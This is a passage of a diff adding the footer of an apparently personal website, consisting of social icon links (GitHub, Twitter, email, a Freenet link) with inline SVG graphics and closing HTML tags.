+            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
+<g>
+	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
+</g>
+</svg></span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!-- Created with Inkscape (http://www.inkscape.org/) -->
+<svg
+   xmlns:svg="http://www.w3.org/2000/svg"
+   xmlns="http://www.w3.org/2000/svg"
+   version="1.0"
+   width="79.12"
+   height="52.64">
+  <defs/>
+  <g
+     transform="translate(-47.495719,-111.30691)">
+    <path
+       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
+       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
+  </g>
+</svg>
+</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
